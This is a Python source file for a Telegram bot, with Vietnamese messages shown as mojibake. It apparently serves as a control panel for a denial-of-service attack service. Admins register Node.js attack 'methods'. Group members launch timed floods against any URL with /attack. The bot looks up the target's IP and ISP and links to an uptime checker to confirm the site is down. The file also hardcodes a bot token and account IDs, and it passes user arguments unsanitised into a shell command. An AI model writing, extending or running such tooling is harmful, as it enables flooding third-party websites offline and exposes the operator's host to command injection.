import time, json, asyncio, socket, requests
from urllib import parse
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from html import escape
import pytz

TOKEN = '7831523452:AAH_eaJxOeUBstLQbnwhY6bMKqr7xz9IvdU'
ADMIN_ID, GROUP_ID = 7371969470, -1002200204153
user_processes = {}

# Thi·∫øt l·∫≠p m√∫i gi·ªù Vi·ªát Nam
VIE_TZ = pytz.timezone('Asia/Ho_Chi_Minh')

def load_methods():
    try:
        return json.load(open('methods.json', 'r'))
    except:
        return {}

def save_methods(data):
    with open('methods.json', 'w') as f:
        json.dump(data, f, indent=4)

def get_ip_and_isp(url):
    try:
        ip = socket.gethostbyname(parse.urlsplit(url).netloc)
        response = requests.get(f"http://ip-api.com/json/{ip}")
        return ip, response.json() if response.ok else None
    except:
        return None, None

async def command_handler(update, context, handler_func, min_args, help_text):
    if len(context.args) < min_args:
        return await update.message.reply_text(help_text)
    return await handler_func(update, context)

async def add_method(update, context, methods_data):
    if update.message.from_user.id != ADMIN_ID:
        return await update.message.reply_text("B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    if len(context.args) < 2:
        return await update.message.reply_text("C√∫ ph√°p kh√¥ng h·ª£p l·ªá. S·ª≠ d·ª•ng l·ªánh nh∆∞ sau: \n/add <method_name> <url> timeset <time> <additional_args>")
    method_name, url = context.args[0], context.args[1]
    attack_time = 60  # Th·ªùi gian m·∫∑c ƒë·ªãnh n·∫øu kh√¥ng c√≥ tham s·ªë timeset
    if 'timeset' in context.args:
        try:
            attack_time = int(context.args[context.args.index('timeset') + 1])
        except:
            return await update.message.reply_text("Tham s·ªë th·ªùi gian kh√¥ng h·ª£p l·ªá.")
        context.args = context.args[:context.args.index('timeset')] + context.args[context.args.index('timeset') + 2:]
    command = f"node --max-old-space-size=102400 {method_name} {url} {attack_time} " + " ".join(context.args[2:])
    methods_data[method_name] = {'command': command, 'url': url, 'time': attack_time}
    save_methods(methods_data)
    await update.message.reply_text(f"Ph∆∞∆°ng th·ª©c {method_name} ƒë√£ ƒë∆∞·ª£c th√™m v√†o.")

async def attack_method(update, context, methods_data):
    if update.message.chat.id != GROUP_ID:
        return await update.message.reply_text("Nh√≥m kh√¥ng h·ª£p l·ªá. L·ªánh n√†y ch·ªâ ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng trong nh√≥m ƒë√£ ch·ªâ ƒë·ªãnh.")
    if update.message.from_user.id in user_processes and user_processes[update.message.from_user.id].returncode is None:
        return await update.message.reply_text("B·∫°n ƒëang c√≥ m·ªôt cu·ªôc t·∫•n c√¥ng ƒëang di·ªÖn ra. Vui l√≤ng ƒë·ª£i cho ƒë·∫øn khi k·∫øt th√∫c tr∆∞·ªõc khi b·∫Øt ƒë·∫ßu cu·ªôc t·∫•n c√¥ng m·ªõi.")
    if len(context.args) < 2:
        return await update.message.reply_text("C√∫ ph√°p kh√¥ng h·ª£p l·ªá. S·ª≠ d·ª•ng l·ªánh nh∆∞ sau: \n/attack <method_name> <url> [time]")
    method_name, url = context.args[0], context.args[1]
    if method_name not in methods_data:
        return await update.message.reply_text("Ph∆∞∆°ng th·ª©c kh√¥ng t·ªìn t·∫°i.")
    attack_time = methods_data[method_name].get('time', None)
    if update.message.from_user.id == ADMIN_ID and len(context.args) > 2:
        try:
            attack_time = int(context.args[2])
        except ValueError:
            return await update.message.reply_text("Tham s·ªë th·ªùi gian kh√¥ng h·ª£p l·ªá. Vui l√≤ng nh·∫≠p m·ªôt s·ªë h·ª£p l·ªá.")
    if update.message.from_user.id != ADMIN_ID and len(context.args) > 2:
        return await update.message.reply_text("B·∫°n kh√¥ng ph·∫£i l√† admin. B·∫°n kh√¥ng th·ªÉ ch·ªâ ƒë·ªãnh th·ªùi gian cho cu·ªôc t·∫•n c√¥ng.")
    if not attack_time:
        return await update.message.reply_text(f"Th·ªùi gian t·∫•n c√¥ng c·ªßa ph∆∞∆°ng th·ª©c {method_name} kh√¥ng ƒë∆∞·ª£c thi·∫øt l·∫≠p trong methods.json.")
    ip, isp_info = get_ip_and_isp(url)
    if not ip:
        return await update.message.reply_text("Kh√¥ng th·ªÉ l·∫•y IP t·ª´ URL.")
    command = methods_data[method_name]['command'].replace(methods_data[method_name]['url'], url).replace(str(methods_data[method_name]['time']), str(attack_time))
    isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False) if isp_info else 'Kh√¥ng c√≥ th√¥ng tin ISP.'
    username = update.message.from_user.username or update.message.from_user.full_name
    start_time = time.time()  # Th·ªùi gian b·∫Øt ƒë·∫ßu cu·ªôc t·∫•n c√¥ng
    check_status_button = InlineKeyboardButton("üîç Ki·ªÉm tra tr·∫°ng th√°i website", url=f"https://check-host.net/check-http?host={url}")
    keyboard = InlineKeyboardMarkup([[check_status_button]])
    # ƒê·ªïi m√∫i gi·ªù th√†nh gi·ªù Vi·ªát Nam
    start_time_vn = datetime.fromtimestamp(start_time, VIE_TZ).strftime('%Y-%m-%d %H:%M:%S')
    
    await update.message.reply_text(
        f"Cu·ªôc t·∫•n c√¥ng {method_name} ƒë√£ ƒë∆∞·ª£c b·∫Øt ƒë·∫ßu b·ªüi @{username}.\nTh√¥ng tin ISP c·ªßa m√°y ch·ªß {escape(url)}:\n<pre>{escape(isp_info_text)}</pre>\n"
        f"Cu·ªôc t·∫•n c√¥ng s·∫Ω k√©o d√†i {attack_time} gi√¢y.\n"
        f"Cu·ªôc t·∫•n c√¥ng b·∫Øt ƒë·∫ßu l√∫c: {start_time_vn}",
        parse_mode='HTML', reply_markup=keyboard
    )
    asyncio.create_task(execute_attack(command, update, method_name, keyboard, url, start_time, attack_time))

async def execute_attack(command, update, method_name, keyboard, url, start_time, attack_time):
    try:
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        user_processes[update.message.from_user.id] = process
        stdout, stderr = await process.communicate()
        end_time = time.time()
        attack_status = "th√†nh c√¥ng" if not stderr else "th·∫•t b·∫°i"
        error_message = stderr.decode() if stderr else None
    except Exception as e:
        end_time = time.time()
        attack_status = "th·∫•t b·∫°i"
        error_message = str(e)
    elapsed_time = round(end_time - start_time, 2)
    attack_info = {
        "method_name": method_name,
        "username": update.message.from_user.username or update.message.from_user.full_name,
        "start_time": datetime.fromtimestamp(start_time, VIE_TZ).strftime('%Y-%m-%d %H:%M:%S'),
        "end_time": datetime.fromtimestamp(end_time, VIE_TZ).strftime('%Y-%m-%d %H:%M:%S'),
        "elapsed_time": elapsed_time,
        "attack_status": attack_status,
        "error": error_message or "Kh√¥ng c√≥"
    }
    attack_info_text = json.dumps(attack_info, indent=2, ensure_ascii=False)
    safe_attack_info_text = escape(attack_info_text)
    await update.message.reply_text(
        f"Cu·ªôc t·∫•n c√¥ng ƒë√£ ho√†n th√†nh! T·ªïng th·ªùi gian: {elapsed_time} gi√¢y.\n\nChi ti·∫øt:\n<pre>{safe_attack_info_text}</pre>",
        parse_mode='HTML', reply_markup=keyboard
    )
    del user_processes[update.message.from_user.id]

async def list_methods(update, methods_data):
    if not methods_data:
        return await update.message.reply_text("Kh√¥ng c√≥ ph∆∞∆°ng th·ª©c n√†o.")
    methods_list = "C√°c ph∆∞∆°ng th·ª©c c√≥ s·∫µn:\n" + "\n".join([f"{name}: {data['time']} gi√¢y" for name, data in methods_data.items()])
    await update.message.reply_text(methods_list)

async def delete_method(update, context, methods_data):
    if update.message.from_user.id != ADMIN_ID:
        return await update.message.reply_text("B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    if len(context.args) < 1:
        return await update.message.reply_text("C√∫ ph√°p kh√¥ng h·ª£p l·ªá. S·ª≠ d·ª•ng l·ªánh nh∆∞ sau: \n/del <method_name>")
    method_name = context.args[0]
    if method_name in methods_data:
        del methods_data[method_name]
        save_methods(methods_data)
        await update.message.reply_text(f"Ph∆∞∆°ng th·ª©c {method_name} ƒë√£ ƒë∆∞·ª£c x√≥a.")
    else:
        await update.message.reply_text(f"Ph∆∞∆°ng th·ª©c {method_name} kh√¥ng t·ªìn t·∫°i.")

async def help_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
    **/add <method_name> <url> timeset <time>**: Th√™m m·ªôt ph∆∞∆°ng th·ª©c t·∫•n c√¥ng m·ªõi (Ch·ªâ Admin).
    **/attack <method_name> <url> [time]**: Kh·ªüi ƒë·ªông m·ªôt cu·ªôc t·∫•n c√¥ng s·ª≠ d·ª•ng ph∆∞∆°ng th·ª©c ƒë√£ th√™m (Ch·ªâ Admin).
    **/methods**: Xem c√°c ph∆∞∆°ng th·ª©c c√≥ s·∫µn.
    **/del <method_name>**: X√≥a m·ªôt ph∆∞∆°ng th·ª©c (Ch·ªâ Admin).
    **/help**: Hi·ªÉn th·ªã h∆∞·ªõng d·∫´n s·ª≠ d·ª•ng c√°c l·ªánh.
    """
    await update.message.reply_text(help_text)

def main():
    methods_data = load_methods()
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("add", lambda update, context: command_handler(update, context, lambda u, c: add_method(u, c, methods_data), 2, "C√∫ ph√°p kh√¥ng h·ª£p l·ªá. S·ª≠ d·ª•ng l·ªánh nh∆∞ sau: \n/add <method_name> <url> timeset <time> <additional_args>")))
    application.add_handler(CommandHandler("attack", lambda update, context: command_handler(update, context, lambda u, c: attack_method(u, c, methods_data), 2, "C√∫ ph√°p kh√¥ng h·ª£p l·ªá. S·ª≠ d·ª•ng l·ªánh nh∆∞ sau: \n/attack <method_name> <url> [time]")))
    application.add_handler(CommandHandler("methods", lambda update, context: list_methods(update, methods_data)))
    application.add_handler(CommandHandler("del", lambda update, context: delete_method(update, context, methods_data)))
    application.add_handler(CommandHandler("help", help_message))
    application.run_polling()

if __name__ == "__main__": main()
